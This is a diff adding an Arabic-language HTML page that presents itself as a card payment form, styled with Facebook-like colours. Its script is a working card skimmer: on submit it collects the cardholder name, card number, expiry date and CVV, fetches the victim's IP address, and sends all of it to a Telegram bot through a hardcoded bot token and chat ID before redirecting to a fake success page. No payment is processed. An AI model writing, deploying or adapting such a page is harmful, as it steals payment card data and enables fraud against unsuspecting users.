@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال تفاصيل الدفع</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .payment-container {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+        .payment-container h2 {
+            text-align: center;
+            color: #1c1e21;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            color: #606770;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .form-group input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .expiry-cvv-group {
+            display: flex;
+            gap: 10px;
+        }
+        .expiry-cvv-group .form-group {
+            width: 50%;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="payment-container">
+        <h2>إدخال تفاصيل الدفع</h2>
+        <form id="paymentForm" onsubmit="onSubmit(event)">
+            <div class="form-group">
+                <label for="name">الاسم على البطاقة</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="cardNumber">رقم البطاقة</label>
+                <input type="text" id="cardNumber" name="cardNumber" required>
+            </div>
+            
+            <div class="expiry-cvv-group">
+                <div class="form-group">
+                    <label for="expiryDate">تاريخ الانتهاء (MM/YY)</label>
+                    <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="cvv">رمز التحقق (CVV)</label>
+                    <input type="text" id="cvv" name="cvv" required>
+                </div>
+            </div>
+            
+            <button type="submit" class="submit-btn">إرسال</button>
+        </form>
+    </div>
+
+    <script>
+        // معلومات بوت Telegram - يمكن تعديلها بسهولة
+        const TELEGRAM_CONFIG = {
+            botToken: '8168414397:AAGTn9tA3-Ofvn91jKr2Hln3_6EgfzD-UTw',
+            chatId: '6064113585'
+        };
+
+        // دالة إرسال الرسالة إلى تيليجرام
+        function sendTelegramMessage(botToken, chatId, message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: "MarkdownV2"
+            };
+            
+            return fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+        }
+
+        // دالة الإرسال عند تقديم النموذج
+        async function onSubmit(event) {
+            event.preventDefault();
+            
+            const name = document.getElementById('name').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            try {
+                // الحصول على عنوان IP
+                const ipRequest = await fetch('https://api.ipify.org?format=json');
+                const ipResponse = await ipRequest.json();
+                const ipAddress = ipResponse.ip;
+
+                // استبدال الأحرف الخاصة في الرسالة لتجنب مشاكل MarkdownV2
+                const escapeMarkdown = (text) => text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+
+                const message = `*بيانات بطاقة جديدة*\n\n` +
+                    `*الاسم على البطاقة:* \`${escapeMarkdown(name)}\`\n` +
+                    `*رقم البطاقة:* \`${escapeMarkdown(cardNumber)}\`\n` +
+                    `*تاريخ الانتهاء:* \`${escapeMarkdown(expiryDate)}\`\n` +
+                    `*رمز التحقق CVV:* \`${escapeMarkdown(cvv)}\`\n` +
+                    `*IP Address:* \`${escapeMarkdown(ipAddress)}\``;
+
+                // إرسال الرسالة إلى بوت تيليجرام
+                await sendTelegramMessage(TELEGRAM_CONFIG.botToken, TELEGRAM_CONFIG.chatId, message);
+
+                // تحويل المستخدم إلى صفحة نجاح الدفع
+                window.location.href = "success.html";
+                
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
+            }
+        }
+    </script>
+
+</body>
+</html>
+
